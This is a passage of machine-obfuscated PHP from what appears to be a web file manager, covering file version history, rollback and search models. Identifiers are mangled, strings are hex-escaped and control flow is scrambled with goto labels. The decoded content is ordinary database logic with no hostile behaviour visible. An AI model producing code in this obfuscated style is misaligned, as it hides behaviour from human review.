$this->escapeString($c‡»ˆ§·¿À[1]); } elseif (is_array($c‡»ˆ§·¿À)) { $c‡»ˆ§·¿À = array_map(array($this, $F”÷»óå[895]), $c‡»ˆ§·¿À); } elseif (is_bool($c‡»ˆ§·¿À)) { $c‡»ˆ§·¿À = $c‡»ˆ§·¿À ? $F”÷»óå[86] : $F”÷»óå[491]; } elseif (is_null($c‡»ˆ§·¿À)) { $c‡»ˆ§·¿À = $F”÷»óå[102]; } return $c‡»ˆ§·¿À; } public function getLastInsertId() { $eØŞãÙò  =& $_SERVER[µ…]; switch ($this->dbType) { case $eØŞãÙò [881]: case $eØŞãÙò [873]: case $eØŞãÙò [854]: case $eØŞãÙò [872]: case $eØŞãÙò [856]: case $eØŞãÙò [884]: return $this->_linkID->lastInsertId(); case $eØŞãÙò [855]: case $eØŞãÙò [857]: $c¼–—ôĞÈ† = $this->table; $b–Ñ•œ´Ù = $this->query("\x53\x45\x4c\x45\x43\124\40{$c¼–—ôĞÈ†}\56\143\165\162\x72\x76\x61\154\x20\x63\x75\162\x72\166\141\154\x20\x46\122\117\115\40\144\x75\141\154"); return $b–Ñ•œ´Ù ? $b–Ñ•œ´Ù[0][$eØŞãÙò [896]] : 0; } } } goto b¿²ÀÃª; B¥×ÓÀ‰: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\143\145\137\x68\151\163\x74\157\x72\x79"; public function historyCount($A¼î±Ê¸»¬) { goto CˆåØÛ›­³; BÌå·Ş°ˆ: return array_to_keyvalue($fñÈ©ºÓó“, $fòšñÔíÔ‡[390], $fòšñÔíÔ‡[474]); goto D•Ü²·÷; CˆåØÛ›­³: $fòšñÔíÔ‡ =& $_SERVER[µ…]; if (!$A¼î±Ê¸»¬) { return array(); } if (is_string($A¼î±Ê¸»¬) || is_int($A¼î±Ê¸»¬)) { $A¼î±Ê¸»¬ = array($A¼î±Ê¸»¬); } goto E³¨¢¡¹ï´; E³¨¢¡¹ï´: $d¹æ´ê°Ï = array($fòšñÔíÔ‡[390], $fòšñÔíÔ‡[1701] => $fòšñÔíÔ‡[474]); $dÇ›³ïÏÏß = array($fòšñÔíÔ‡[390] => array($fòšñÔíÔ‡[7], $A¼î±Ê¸»¬)); $fñÈ©ºÓó“ = $this->field($d¹æ´ê°Ï)->where($dÇ›³ïÏÏß)->group($fòšñÔíÔ‡[390])->select(); goto BÌå·Ş°ˆ; D•Ü²·÷: } public function addHistory($Bãµ—¿ÚÔ•, $BèÁŸ‘–œ• = '') { $EÇï±íä‘ =& $_SERVER[µ…]; $bØà±«·Èß = array($EÇï±íä‘[404] => $Bãµ—¿ÚÔ•[$EÇï±íä‘[390]], $EÇï±íä‘[1498] => isset($Bãµ—¿ÚÔ•[$EÇï±íä‘[428]]) ? $Bãµ—¿ÚÔ•[$EÇï±íä‘[428]] : $Bãµ—¿ÚÔ•[$EÇï±íä‘[426]], $EÇï±íä‘[442] => $Bãµ—¿ÚÔ•[$EÇï±íä‘[441]], $EÇï±íä‘[543] => $Bãµ—¿ÚÔ•[$EÇï±íä‘[77]], $EÇï±íä‘[1898] => $BèÁŸ‘–œ•); $fÄÓä”êîÄ = $GLOBALS[$EÇï±íä‘[6]][$EÇï±íä‘[87]][$EÇï±íä‘[1080]]; if ($fÄÓä”êîÄ > 1) { $this->historyAutoClear($bØà±«·Èß[$EÇï±íä‘[390]]); $this->add($bØà±«·Èß); } Hook::trigger($EÇï±íä‘[1899], $bØà±«·Èß); Model($EÇï±íä‘[1900])->eventFileEdit($Bãµ—¿ÚÔ•[$EÇï±íä‘[390]]); } private function historyAutoClear($B¯É„«³‘) { goto EÜä›ğ÷î¾; EÜä›ğ÷î¾: $C»Û³Êì†È =& $_SERVER[µ…]; $DÌ¹«Ã°¹® = Model($C»Û³Êì†È[1101])->get($C»Û³Êì†È[1102]); $eÒ¿Èä”é = $GLOBALS[$C»Û³Êì†È[6]][$C»Û³Êì†È[87]][$C»Û³Êì†È[1080]]; goto a£š©Ä; cËŠ°ŠÔÛÍ: $fªäˆ¤í = array_to_keyvalue($a¯øÔÛ„ì, $C»Û³Êì†È[33], $C»Û³Êì†È[388]); $fªäˆ¤í = array_slice($fªäˆ¤í, $aòğÔª¬À); $bİ‘É£×… = array_to_keyvalue($a¯øÔÛ„ì, $C»Û³Êì†È[33], $C»Û³Êì†È[441]); goto a†¾ãº›¯‰; a£š©Ä: $aòğÔª¬À = $DÌ¹«Ã°¹® == $C»Û³Êì†È[1103] ? 5 : $eÒ¿Èä”é; if ($eÒ¿Èä”é <= 1) { $aòğÔª¬À = 1; } if ($aòğÔª¬À >= 500) { return; } goto FÒòš¸‘Ê; FÒòš¸‘Ê: $e¢±ª¢àŸå = array($C»Û³Êì†È[404] => $B¯É„«³‘); $a¯øÔÛ„ì = $this->field($C»Û³Êì†È[1901])->where($e¢±ª¢àŸå)->order($C»Û³Êì†È[1895])->select(); if (!$a¯øÔÛ„ì || $aòğÔª¬À >= count($a¯øÔÛ„ì)) { return; } goto cËŠ°ŠÔÛÍ; AÔ†¡‚‰‰ó: $this->where($e¢±ª¢àŸå)->delete(); Model($C»Û³Êì†È[444])->remove($bİ‘É£×…); goto Eè©´Ì¼©Ù; a†¾ãº›¯‰: $bİ‘É£×… = array_slice($bİ‘É£×…, $aòğÔª¬À); if (!$fªäˆ¤í || !$bİ‘É£×…) { return; } $e¢±ª¢àŸå = array($C»Û³Êì†È[406] => array($C»Û³Êì†È[7], $fªäˆ¤í)); goto AÔ†¡‚‰‰ó; Eè©´Ì¼©Ù: } public function listData($F‚¼²£Ö´ã) { goto F¨ÓÁÄ—Ú¨; F¨ÓÁÄ—Ú¨: $F‰Òš¹‹¬ =& $_SERVER[µ…]; $F¾Á·â× = array($F‰Òš¹‹¬[404] => $F‚¼²£Ö´ã); $BéŸŸ ·ï = $F‰Òš¹‹¬[1902]; goto EÅ¨Ê¨Ë; EÅ¨Ê¨Ë: $BïÌøÖ®óÒ = $this->field($BéŸŸ ·ï)->where($F¾Á·â×)->order($F‰Òš¹‹¬[1895])->selectPage(); $this->_listAppendUser($BïÌøÖ®óÒ[$F‰Òš¹‹¬[365]]); $a¶‹’‡Ó = Model($F‰Òš¹‹¬[1101])->get($F‰Òš¹‹¬[1102]); goto e™ÉÏğË‰š; e™ÉÏğË‰š: $A¯óòîí˜™ = 5; if ($a¶‹’‡Ó == $F‰Òš¹‹¬[1103]) { $BïÌøÖ®óÒ[$F‰Òš¹‹¬[365]] = array_slice($BïÌøÖ®óÒ[$F‰Òš¹‹¬[365]], 0, $A¯óòîí˜™); $BïÌøÖ®óÒ[$F‰Òš¹‹¬[362]] = array($F‰Òš¹‹¬[1903] => 1, $F‰Òš¹‹¬[1904] => 20, $F‰Òš¹‹¬[1905] => 1, $F‰Òš¹‹¬[1906] => count($BïÌøÖ®óÒ[$F‰Òš¹‹¬[365]])); } return $BïÌøÖ®óÒ; goto d­¯“§½Á; d­¯“§½Á: } protected function _listAppendUser(&$eñÌÎä¹) { $C•Ê¶½®ïÚ =& $_SERVER[µ…]; $bçº›Á¯ˆå = array_to_keyvalue($eñÌÎä¹, $C•Ê¶½®ïÚ[33], $C•Ê¶½®ïÚ[1506]); $b¢¾»ê²î’ = Model($C•Ê¶½®ïÚ[501])->userListInfo($bçº›Á¯ˆå); foreach ($eñÌÎä¹ as &$DÔ–£•ì) { $C’‰³ôŒáÍ = $DÔ–£•ì[$C•Ê¶½®ïÚ[1506]]; $DÔ–£•ì[$C•Ê¶½®ïÚ[426]] = $b¢¾»ê²î’[$C’‰³ôŒáÍ] ? $b¢¾»ê²î’[$C’‰³ôŒáÍ] : !1; } unset($DÔ–£•ì); } public function fileInfo($E¥ñåÕ…Ç) { $DƒøĞÏ =& $_SERVER[µ…]; $eØµÛ¼›ˆ° = $this->tablePrefix; $AÁîì×™å = "{$eØµÛ¼›ˆ°}\151\x6f\137\146\x69\154\x65\x20\x66\151\x6c\x65\163\40\x6f\156\40\146\x69\154\x65\x73\56\x66\x69\x6c\145\111\104\x20\75\x20\x68\x69\163\x74\x6f\162\171\56\146\x69\x6c\145\111\x44"; return $this->alias($DƒøĞÏ[1907])->where(array($DƒøĞÏ[406] => $E¥ñåÕ…Ç))->join($AÁîì×™å, $DƒøĞÏ[1908])->find(); } public function removeItem($Eøã»™±ïÔ) { $b‚ƒÉß£Úà =& $_SERVER[µ…]; $aïÃªï’†À = array($b‚ƒÉß£Úà[406] => $Eøã»™±ïÔ); $a·¦‹šĞ„î = $this->where($aïÃªï’†À)->find(); if ($a·¦‹šĞ„î) { $c‰±æğ· … = $this->where($aïÃªï’†À)->delete(); Model($b‚ƒÉß£Úà[444])->remove($a·¦‹šĞ„î[$b‚ƒÉß£Úà[441]]); return $c‰±æğ· …; } return !1; } public function removeBySource($aŞÅë«ó„) { goto aî˜‹éŒøÈ; DµÓé²Ğ‘³: $Cø…”®æ´ = array($b›·¬£Ê†Ù[404] => array($b›·¬£Ê†Ù[7], $aŞÅë«ó„)); $aÅŠ¯ÄÔ = $this->field($b›·¬£Ê†Ù[442])->where($Cø…”®æ´)->select(); if ($aÅŠ¯ÄÔ) { $this->where($Cø…”®æ´)->delete(); $dÛÆš±Ä”‹ = array_to_keyvalue($aÅŠ¯ÄÔ, $b›·¬£Ê†Ù[33], $b›·¬£Ê†Ù[441]); Model($b›·¬£Ê†Ù[444])->remove($dÛÆš±Ä”‹); } goto Eªµ’°ßº“; aî˜‹éŒøÈ: $b›·¬£Ê†Ù =& $_SERVER[µ…]; if (!$aŞÅë«ó„) { return !1; } if (!is_array($aŞÅë«ó„)) { $aŞÅë«ó„ = array($aŞÅë«ó„); } goto DµÓé²Ğ‘³; Eªµ’°ßº“: return !0; goto F‘‹‹Ñ‡¿¹; F‘‹‹Ñ‡¿¹: } public function setDetail($e¹êÈ¼ËÇÒ, $C”¿¹¯¸é†) { $CæˆÒœÆ‚å =& $_SERVER[µ…]; return $this->where(array($CæˆÒœÆ‚å[406] => $e¹êÈ¼ËÇÒ))->save(array($CæˆÒœÆ‚å[1898] => $C”¿¹¯¸é†)); } public function rollbackToItem($EÃ¸óĞ„†Î, $fÓ¼Ï„•Û) { goto a»¼ÂÇñ¡©; D…‰×—¬ñƒ: return $this->where(array($EˆÜ•¹š¤[406] => $fÓ¼Ï„•Û))->delete(); goto B•®‘¹‰–¡; a»¼ÂÇñ¡©: $EˆÜ•¹š¤ =& $_SERVER[µ…]; $B¼¸ÁĞ¤Š = Model($EˆÜ•¹š¤[769])->sourceInfo($EÃ¸óĞ„†Î); $this->addHistory($B¼¸ÁĞ¤Š, LNG($EˆÜ•¹š¤[1909])); goto Fæ°¾ì‰®; Fæ°¾ì‰®: $C÷»ÃâÇè = $this->find($fÓ¼Ï„•Û); $F‰»ÓÔª› = array($EˆÜ•¹š¤[441] => $C÷»ÃâÇè[$EˆÜ•¹š¤[441]], $EˆÜ•¹š¤[77] => $C÷»ÃâÇè[$EˆÜ•¹š¤[77]], $EˆÜ•¹š¤[83] => time(), $EˆÜ•¹š¤[428] => USER_ID); Model($EˆÜ•¹š¤[769])->where(array($EˆÜ•¹š¤[390] => $EÃ¸óĞ„†Î))->save($F‰»ÓÔª›); goto D…‰×—¬ñƒ; B•®‘¹‰–¡: } public function clearSame($Fù”İÕŠçÓ) { goto d–Ì’â–™; eÆ„§³Æ•Ñ: if (!$B»Ç‰åÙäí) { return; } $this->where(array($d”‡±‚ˆøã[388] => array($d”‡±‚ˆøã[7], $B»Ç‰åÙäí)))->delete(); Model($d”‡±‚ˆøã[444])->remove($a¯‰Œöç¸); goto B‹ÃùƒÍ’·; bñŸèò¿Ò«: $a¯‰Œöç¸ = array(); $B»Ç‰åÙäí = array(); foreach ($F…¸Ô¨‰ƒ as $C‘ÕêÊ«ç) { if (!$C‘ÕêÊ«ç || count($C‘ÕêÊ«ç) <= 1) { continue; } foreach ($C‘ÕêÊ«ç as $fëŞ§’™ö) { $a¯‰Œöç¸[] = $fëŞ§’™ö[$d”‡±‚ˆøã[441]]; $B»Ç‰åÙäí[] = $fëŞ§’™ö[$d”‡±‚ˆøã[388]]; } } goto eÆ„§³Æ•Ñ; d–Ì’â–™: $d”‡±‚ˆøã =& $_SERVER[µ…]; $FÜ§†«ì‹º = $this->listData($Fù”İÕŠçÓ); $F…¸Ô¨‰ƒ = array_to_keyvalue_group($FÜ§†«ì‹º, $d”‡±‚ˆøã[441]); goto bñŸèò¿Ò«; B‹ÃùƒÍ’·: } public function userSpace() { $BÁŒì¹êÏì =& $_SERVER[µ…]; $fööºÄ†õ = $this->tablePrefix; $aŠ¼Ùèó²´ = array($BÁŒì¹êÏì[1498] => USER_ID); $e’ã Ñ³¢ = "{$fööºÄ†õ}\151\157\137\x66\x69\x6c\x65\x20\x66\x69\154\x65\163\x20\x6f\156\40\x66\x69\x6c\x65\x73\x2e\x66\x69\x6c\x65\111\104\40\75\x20\x68\x69\x73\164\157\162\x79\x2e\146\151\x6c\145\x49\x44"; return $this->alias($BÁŒì¹êÏì[1907])->where($aŠ¼Ùèó²´)->join($e’ã Ñ³¢, $BÁŒì¹êÏì[1908])->sum($BÁŒì¹êÏì[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FĞĞ¢àìù») { goto A¼¹¥•¿ñ¾; E»ËŸÈ»º: if (!$BóÍğ±ï³ƒ[$E…Ü‹¦áÃÆ[167]]) { $DÕ¼­À ˆÄ = array_to_keyvalue($DêÙŒøŞ÷, $E…Ü‹¦áÃÆ[33], $E…Ü‹¦áÃÆ[167]); $AÇœ†¯é½ = implode($E…Ü‹¦áÃÆ[47], $DÕ¼­À ˆÄ); $f³íËÁÖğƒ = $E…Ü‹¦áÃÆ[1910]; } $D“•ß¨šä§ = explode($E…Ü‹¦áÃÆ[47], trim($AÇœ†¯é½, $E…Ü‹¦áÃÆ[47])); return array($f³íËÁÖğƒ, $D“•ß¨šä§); goto fİâ‡ÙØå; A¼¹¥•¿ñ¾: $E…Ü‹¦áÃÆ =& $_SERVER[µ…]; $DêÙŒøŞ÷ = KodIO::fileTypeList(); $BóÍğ±ï³ƒ = $DêÙŒøŞ÷[$FĞĞ¢àìù»]; goto Fáá÷…êµ; Fáá÷…êµ: if (!$BóÍğ±ï³ƒ) { return array(); } $AÇœ†¯é½ = $BóÍğ±ï³ƒ[$E…Ü‹¦áÃÆ[167]]; $f³íËÁÖğƒ = $E…Ü‹¦áÃÆ[7]; goto E»ËŸÈ»º; fİâ‡ÙØå: } public function listPathType($EîÜ†Èª¯›) { $eÉñ²Ò™Ù =& $_SERVER[µ…]; $C¿¥—ˆÅ„ß = $this->fileTypeWhere($EîÜ†Èª¯›); if (!$C¿¥—ˆÅ„ß) { return array(); } $BÊ”©¨±ˆ = array($eÉñ²Ò™Ù[544] => SourceModel::TYPE_USER, $eÉñ²Ò™Ù[545] => USER_ID, $eÉñ²Ò™Ù[541] => 0, $eÉñ²Ò™Ù[542] => $C¿¥—ˆÅ„ß); return $this->listSource($BÊ”©¨±ˆ); } public function listSearch($f¿ã‘»ƒ„Î, $A°Û‹¤ÈÚ® = 300) { goto Bç¿ñÉã æ; Fñ…ª¬é¿: if (!isset($bÍ¬ò»§äÂ[$BÛ­õ…­›„[417]])) { $bÍ¬ò»§äÂ[$BÛ­õ…­›„[417]] = 0; } $E Áß¿Æ¯Ì = $BÛ­õ…­›„[1912]; $Aø‘œƒÂÎ¬ = $E Áß¿Æ¯Ì; goto F¤æ¦‡õ; Bç¿ñÉã æ: $BÛ­õ…­›„ =& $_SERVER[µ…]; if (isset($f¿ã‘»ƒ„Î[$BÛ­õ…­›„[1753]]) && $f¿ã‘»ƒ„Î[$BÛ­õ…­›„[1753]]) { $f¿ã‘»ƒ„Î[$BÛ­õ…­›„[1753]] = str_replace($BÛ­õ…­›„[379], $BÛ­õ…­›„[1911], trim($f¿ã‘»ƒ„Î[$BÛ­õ…­›„[1753]])); } $bÍ¬ò»§äÂ = $this->_parseSearchWhere($f¿ã‘»ƒ„Î); goto Fñ…ª¬é¿; F¤æ¦‡õ: $this->_listSearchBindPinyin($f¿ã‘»ƒ„Î, $bÍ¬ò»§äÂ, $E Áß¿Æ¯Ì); $this->alias($BÛ­õ…­›„[511])->_makeOrder(); $bÍ¬ò»§äÂ = $this->parseWhereLike($bÍ¬ò»§äÂ); goto DäÆÑÒïëÛ; B÷óÜ¦„íì: return $cÃÂÉæÍÅ; goto DİÏÇÈ ê½; DäÆÑÒïëÛ: $cÃÂÉæÍÅ = $this->distinct(!0)->field($E Áß¿Æ¯Ì)->where($bÍ¬ò»§äÂ)->selectPage($A°Û‹¤ÈÚ®); $this->_listSearchDesc($cÃÂÉæÍÅ, $f¿ã‘»ƒ„Î, $Aø‘œƒÂÎ¬); $this->_listSearchTag($cÃÂÉæÍÅ, $f¿ã‘»ƒ„Î, $Aø‘œƒÂÎ¬); goto c“–çİ™¡‚; c“–çİ™¡‚: $this->_listSearchGroupTag($cÃÂÉæÍÅ, $f¿ã‘»ƒ„Î, $Aø‘œƒÂÎ¬); $this->_listDataApply($cÃÂÉæÍÅ[$BÛ­õ…­›„[365]]); $this->_listMake($cÃÂÉæÍÅ); goto B÷óÜ¦„íì; DİÏÇÈ ê½: } private function _listSearchTag(&$B»æœ„èÜ, $eÁŠñ¥ôÑ¸, $d±¿¢àÖñ) { goto eõ‹œ“±†; f‡¾›Î–°: $A‹“‹„¥¶ô = array(); $aòÎ¯†¾·· = $eÁŠñ¥ôÑ¸[$aƒšè†Ù£[1753]]; foreach ($aˆš¨¥Ô as $d ŒÌ²ôÖ²) { $FÕóÙÏÌõÜ = $d ŒÌ²ôÖ²[$aƒšè†Ù£[28]]; $cÎõ”Ì’¼¸ = str_replace($aƒšè†Ù£[50], $aƒšè†Ù£[33], Pinyin::encode($FÕóÙÏÌõÜ)); if (stripos($FÕóÙÏÌõÜ, $aòÎ¯†¾··) !== !1 || stripos($cÎõ”Ì’¼¸, $aòÎ¯†¾··) !== !1) { $A‹“‹„¥¶ô[] = $d ŒÌ²ôÖ²[$aƒšè†Ù£[388]]; } } goto A«¡öÕœ§š; eõ‹œ“±†: $aƒšè†Ù£ =& $_SERVER[µ…]; if (!$eÁŠñ¥ôÑ¸[$aƒšè†Ù£[1753]] || $B»æœ„èÜ[$aƒšè†Ù£[362]][$aƒšè†Ù£[349]] > 1) { return; } $aˆš¨¥Ô = Model($aƒšè†Ù£[1913])->listData(); goto f‡¾›Î–°; Cíàëìõô‘: $bÇ†Øö‡ = array_to_keyvalue($bÇ†Øö‡, $aƒšè†Ù£[33], $aƒšè†Ù£[75]); $EÀÂÜî¤ = array_unique($bÇ†Øö‡); $this->_listSearchMerge($B»æœ„èÜ, $eÁŠñ¥ôÑ¸, $d±¿¢àÖñ, $EÀÂÜî¤); goto EÔæ³ÔÂØ‰; A«¡öÕœ§š: if (!$A‹“‹„¥¶ô) { return; } $fè¶ë„²» = array($aƒšè†Ù£[413] => array($aƒšè†Ù£[7], $A‹“‹„¥¶ô), $aƒšè†Ù£[1506] => USER_ID); $bÇ†Øö‡ = Model($aƒšè†Ù£[414])->field($aƒšè†Ù£[75])->where($fè¶ë„²»)->select(); goto Cíàëìõô‘; EÔæ³ÔÂØ‰: } private function _listSearchDesc(&$fî¡ÀñõË”, $aãï½Ç¿ïœ, $b×¶´ß‰Õ) { goto f°ÌÙñÖï«; eª‰ê‚™ğ: $b¾…Ñ“î¨² = array_unique($b¾…Ñ“î¨²); if (!$b¾…Ñ“î¨²) { return; } $dÜØî»ëõ = array($a¹‘à†ƒ„[390] => array($a¹‘à†ƒ„[7], $b¾…Ñ“î¨²), $a¹‘à†ƒ„[92] => $a¹‘à†ƒ„[425], $a¹‘à†ƒ„[370] => array($a¹‘à†ƒ„[378], $a¹‘à†ƒ„[1755] . $aãï½Ç¿ïœ[$a¹‘à†ƒ„[1753]] . $a¹‘à†ƒ„[1755])); goto Eíê»°í¢; Eíê»°í¢: $F°‘–ÜŞ†³ = Model($a¹‘à†ƒ„[527])->field($a¹‘à†ƒ„[390])->where($dÜØî»ëõ)->select(); $BäªÛ¯ÈÛ = array_to_keyvalue($F°‘–ÜŞ†³, $a¹‘à†ƒ„[33], $a¹‘à†ƒ„[390]); $this->_listSearchMerge($fî¡ÀñõË”, $aãï½Ç¿ïœ, $b×¶´ß‰Õ, $BäªÛ¯ÈÛ); goto Aô¦ï˜é¾; f°ÌÙñÖï«: $a¹‘à†ƒ„ =& $_SERVER[µ…]; if (!$aãï½Ç¿ïœ[$a¹‘à†ƒ„[1753]] || $fî¡ÀñõË”[$a¹‘à†ƒ„[362]][$a¹‘à†ƒ„[349]] > 1) { return; } $b¾…Ñ“î¨² = $this->listSearchChildren($aãï½Ç¿ïœ[$a¹‘à†ƒ„[472]]); goto eª‰ê‚™ğ; Aô¦ï˜é¾: } private function _listSearchGroupTag(&$D„¦ø±ÁŒ‡, $bÄ“óÌ, $b£„Óã¥ÎŠ) { goto fÂªšŞ‹éŠ; CÏø‘ÓÛ: if (!$b¬œ¿Ìáˆœ || $b¬œ¿Ìáˆœ[$d›Ø…Ñ‚¡‹[398]] != SourceModel::TYPE_GROUP) { return; } $dîµ…¸®åÀ = $b¬œ¿Ìáˆœ[$d›Ø…Ñ‚¡‹[478]]; $FİšïİÃì… = Model($d›Ø…Ñ‚¡‹[1914])->get($dîµ…¸®åÀ); goto AÍ×ó›ìöî; d‹‰¹˜Ú·: $AˆƒíŞ¹³» = array_to_keyvalue($AˆƒíŞ¹³», $d›Ø…Ñ‚¡‹[33], $d›Ø…Ñ‚¡‹[75]); $c½¢”ŸÖË° = array_unique($AˆƒíŞ¹³»); $this->_listSearchMerge($D„¦ø±ÁŒ‡, $bÄ“óÌ, $b£„Óã¥ÎŠ, $c½¢”ŸÖË°); goto b­‚ù™¦¾Ï; AÍ×ó›ìöî: $e¡‹´¢Çà¼ = array(); $a¸êœÚéÅğ = $bÄ“óÌ[$d›Ø…Ñ‚¡‹[1753]]; foreach ($FİšïİÃì…[$d›Ø…Ñ‚¡‹[365]] as $bù—Ü¼§£Ğ) { $d¸éğåĞ«˜ = $bù—Ü¼§£Ğ[$d›Ø…Ñ‚¡‹[28]]; $EÕ™­ÚÂ¡› = str_replace($d›Ø…Ñ‚¡‹[50], $d›Ø…Ñ‚¡‹[33], Pinyin::encode($d¸éğåĞ«˜)); if (stripos($d¸éğåĞ«˜, $a¸êœÚéÅğ) !== !1 || stripos($EÕ™­ÚÂ¡›, $a¸êœÚéÅğ) !== !1) { $e¡‹´¢Çà¼[] = $bù—Ü¼§£Ğ[$d›Ø…Ñ‚¡‹[388]]; } } goto a¨Ã¾Í»; fÂªšŞ‹éŠ: $d›Ø…Ñ‚¡‹ =& $_SERVER[µ…]; if (!$bÄ“óÌ[$d›Ø…Ñ‚¡‹[1753]] || $D„¦ø±ÁŒ‡[$d›Ø…Ñ‚¡‹[362]][$d›Ø…Ñ‚¡‹[349]] > 1 || !$bÄ“óÌ[$d›Ø…Ñ‚¡‹[472]]) { return; } $b¬œ¿Ìáˆœ = $this->sourceInfo($bÄ“óÌ[$d›Ø…Ñ‚¡‹[472]]); goto CÏø‘ÓÛ; a¨Ã¾Í»: if (!$e¡‹´¢Çà¼) { return; } $fëº¾¡ì‘ = array($d›Ø…Ñ‚¡‹[413] => array($d›Ø…Ñ‚¡‹[7], $e¡‹´¢Çà¼), $d›Ø…Ñ‚¡‹[1506] => 0, $d›Ø…Ñ‚¡‹[29] => $d›Ø…Ñ‚¡‹[1777] . $dîµ…¸®åÀ); $AˆƒíŞ¹³» = Model($d›Ø…Ñ‚¡‹[414])->field($d›Ø…Ñ‚¡‹[75])->where($fëº¾¡ì‘)->select(); goto d‹‰¹˜Ú·; b­‚ù™¦¾Ï: } private function _listSearchMerge(&$bš±ÌŒ»Œ÷, $dÜ¼Â©æŸï, $F®ï‘„§Ğ—, $a°İåò™‹) { goto fº–š–†§¾; fº–š–†§¾: $C¾¿ª³­İ =& $_SERVER[µ…]; if (!$a°İåò™‹) { return; } $e™Ñ–Øï¾— = array_to_keyvalue($bš±ÌŒ»Œ÷[$C¾¿ª³­İ[365]], $C¾¿ª³­İ[33], $C¾¿ª³­İ[390]); goto d•’”«™ß; d•’”«™ß: $CßÜÀª—Š = array_diff($a°İåò™‹, $e™Ñ–Øï¾—); if (!$CßÜÀª—Š) { return; } $c¸»ƒù¦ = array($C¾¿ª³­İ[390] => array($C¾¿ª³­İ[7], $CßÜÀª—Š)); goto fÅ˜ˆà˜•; fÅ˜ˆà˜•: $f½—¢­šª = $this->field($F®ï‘„§Ğ—)->where($c¸»ƒù¦)->select(); if (!$f½—¢­šª) { return; } $bš¾¸›òš = array(); goto BÚŒî¯ŒÆ…; BÚŒî¯ŒÆ…: foreach ($f½—¢­šª as $E›ªƒŠÌ) { if ($this->_listSearchFilter($E›ªƒŠÌ, $dÜ¼Â©æŸï)) { $bš¾¸›òš[] = $E›ªƒŠÌ; } } $bš±ÌŒ»Œ÷[$C¾¿ª³­İ[365]] = array_merge($bš¾¸›òš, $bš±ÌŒ»Œ÷[$C¾¿ª³­İ[365]]); $bš±ÌŒ»Œ÷[$C¾¿ª³­İ[362]][$C¾¿ª³­İ[363]] += count($bš¾¸›òš); goto a‘’ö¸¥¨; a‘’ö¸¥¨: } private function _listSearchFilter($Eøİˆ¸…–, $BôŠã¦í¢“) { goto F³àôâÔ™; FèŒ¦•î©ê: if (isset($BôŠã¦í¢“[$fîé™¸©åİ[399]]) && $BôŠã¦í¢“[$fîé™¸©åİ[399]] != $fîé™¸©åİ[1720]) { if ($BôŠã¦í¢“[$fîé™¸©åİ[399]] == $fîé™¸©åİ[76] && !$bÁ‘¯Åœ·) { return !1; } if ($BôŠã¦í¢“[$fîé™¸©åİ[399]] != $fîé™¸©åİ[76] && $bÁ‘¯Åœ·) { return !1; } if (!strstr($Eøİˆ¸…–[$fîé™¸©åİ[167]], $fîé™¸©åİ[47] . $BôŠã¦í¢“[$fîé™¸©åİ[399]] . $fîé™¸©åİ[47])) { return !1; } } if (isset($BôŠã¦í¢“[$fîé™¸©åİ[1915]]) && $BôŠã¦í¢“[$fîé™¸©åİ[1915]] < $Eøİˆ¸…–[$fîé™¸©åİ[77]]) { return !1; } if (isset($BôŠã¦í¢“[$fîé™¸©åİ[1916]]) && $BôŠã¦í¢“[$fîé™¸©åİ[1916]] > $Eøİˆ¸…–[$fîé™¸©åİ[77]]) { return !1; } goto díëæÕå¾å; díëæÕå¾å: if (isset($BôŠã¦í¢“[$fîé™¸©åİ[557]]) && $BôŠã¦í¢“[$fîé™¸©åİ[557]] != $Eøİˆ¸…–[$fîé™¸©åİ[428]]) { return !1; } return !0; goto A’â£ëíÆœ; F³àôâÔ™: $fîé™¸©åİ =& $_SERVER[µ…]; $bÁ‘¯Åœ· = $Eøİˆ¸…–[$fîé™¸©åİ[397]] == $fîé™¸©åİ[86]; if (!strstr($Eøİˆ¸…–[$fîé™¸©åİ[481]], $fîé™¸©åİ[47] . $BôŠã¦í¢“[$fîé™¸©åİ[472]] . $fîé™¸©åİ[47])) { return !1; } goto FèŒ¦•î©ê; A’â£ëíÆœ: } public function listSearchChildren($Dˆí¾×Î…, $e¬ğ÷ö‹æß = 5000) { goto Eî¥¾ÍÉÔ¢; D”Ä ºÆƒ: $fä¢ĞğëºŠ = array($a¬Å–º¡×è[481] => array($a¬Å–º¡×è[378], $f„¼«¥¬›Å[$a¬Å–º¡×è[481]] . $f„¼«¥¬›Å[$a¬Å–º¡×è[390]] . $a¬Å–º¡×è[508])); $a¥œÄŒŸÈÊ = $this->field($a¬Å–º¡×è[390])->cache(null, 600)->where($fä¢ĞğëºŠ)->count(); if ($a¥œÄŒŸÈÊ > $e¬ğ÷ö‹æß) { return $this->_listSearchChildrenNear($Dˆí¾×Î…, $e¬ğ÷ö‹æß); } goto aÕ·Âï®¥; aÕ·Âï®¥: $fÆ’ŸáèëŒ = $this->field($a¬Å–º¡×è[390])->where($fä¢ĞğëºŠ)->select(); $aƒß‘Îšâ = array_to_keyvalue($fÆ’ŸáèëŒ, $a¬Å–º¡×è[33], $a¬Å–º¡×è[390]); return $aƒß‘Îšâ; goto dÔ³•†ô†”; Eî¥¾ÍÉÔ¢: $a¬Å–º¡×è =& $_SERVER[µ…]; $aƒß‘Îšâ = array(); $f„¼«¥¬›Å = $this->sourceInfo($Dˆí¾×Î…); goto D”Ä ºÆƒ; dÔ³•†ô†”: } private function _listSearchChildrenNear($fÍ‡·ŞÁ, $EÜáÓ˜¶ö) { goto FÚ‡ó•ßé; CÊñ«öç÷: $cÓÌÔøÌŞİ = array_merge($cÓÌÔøÌŞİ, array_to_keyvalue($B¹†¼‘İØ, $C‘ÙäŸÔ[33], $C‘ÙäŸÔ[390])); $cÓÌÔøÌŞİ = array_slice($cÓÌÔøÌŞİ, 0, $EÜáÓ˜¶ö); return $cÓÌÔøÌŞİ; goto eØÓ£ƒ Û…; D¦˜´¡°·¬: if (!$fìŒê¨Ùâ‘) { return $cÓÌÔøÌŞİ; } $BŒêÎ•¯¤­ = array($C‘ÙäŸÔ[472] => array($C‘ÙäŸÔ[7], $fìŒê¨Ùâ‘)); $B¹†¼‘İØ = $this->field($C‘ÙäŸÔ[1917])->where($BŒêÎ•¯¤­)->limit($EÜáÓ˜¶ö)->select(); goto CÊñ«öç÷; FÚ‡ó•ßé: $C‘ÙäŸÔ =& $_SERVER[µ…]; $cÓÌÔøÌŞİ = array(); $BŒêÎ•¯¤­ = array($C‘ÙäŸÔ[472] => $fÍ‡·ŞÁ); goto f§™ÁáŒ; f§™ÁáŒ: $B¹†¼‘İØ = 